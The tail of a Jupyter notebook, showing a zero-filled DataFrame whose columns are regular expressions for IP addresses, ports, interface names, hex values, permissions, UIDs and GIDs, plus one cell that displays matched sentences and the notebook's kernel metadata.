       "3             0            0  ...     0      0   \n",
       "4             0            0  ...     0      0   \n",
       "5             0            0  ...     0      0   \n",
       "6             0            0  ...     0      0   \n",
       "7             0            0  ...     0      0   \n",
       "8             0            0  ...     0      0   \n",
       "9             0            0  ...     0      0   \n",
       "10            0            0  ...     0      0   \n",
       "11            0            0  ...     0      0   \n",
       "12            0            0  ...     0      0   \n",
       "13            0            0  ...     0      0   \n",
       "14            0            0  ...     0      0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d+  \\\n",
       "0                                        0   \n",
       "1                                        0   \n",
       "2                                        0   \n",
       "3                                        0   \n",
       "4                                        0   \n",
       "5                                        0   \n",
       "6                                        0   \n",
       "7                                        0   \n",
       "8                                        0   \n",
       "9                                        0   \n",
       "10                                       0   \n",
       "11                                       0   \n",
       "12                                       0   \n",
       "13                                       0   \n",
       "14                                       0   \n",
       "\n",
       "    \\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}  eth[0-9]$  0x[0-9a-zA-Z]{8}  \\\n",
       "0                                    0          0                 0   \n",
       "1                                    0          0                 0   \n",
       "2                                    0          0                 0   \n",
       "3                                    0          0                 0   \n",
       "4                                    0          0                 0   \n",
       "5                                    0          0                 0   \n",
       "6                                    0          0                 0   \n",
       "7                                    0          0                 0   \n",
       "8                                    0          0                 0   \n",
       "9                                    0          0                 0   \n",
       "10                                   0          0                 0   \n",
       "11                                   0          0                 0   \n",
       "12                                   0          0                 0   \n",
       "13                                   0          0                 0   \n",
       "14                                   0          0                 0   \n",
       "\n",
       "    permission:{0,1}[0-9]{0,4}  UID  GID  match  \n",
       "0                            0    0    0      0  \n",
       "1                            0    0    0      0  \n",
       "2                            0    0    0      0  \n",
       "3                            0    0    0      0  \n",
       "4                            0    0    0      0  \n",
       "5                            0    0    0      0  \n",
       "6                            0    0    0      0  \n",
       "7                            0    0    0      0  \n",
       "8                            0    0    0      0  \n",
       "9                            0    0    0      0  \n",
       "10                           0    0    0      0  \n",
       "11                           0    0    0      0  \n",
       "12                           0    0    0      0  \n",
       "13                           0    0    0      0  \n",
       "14                           0    0    0      0  \n",
       "\n",
       "[15 rows x 24 columns]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "for rem in fset.rem_lst:\n",
    "    display(rem.get_match_sentences())\n",
    "    break"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.5"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "125a1d8b627fe68767755740015967bae857d08bb92fb3fd0d9d8ed24f978d39"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
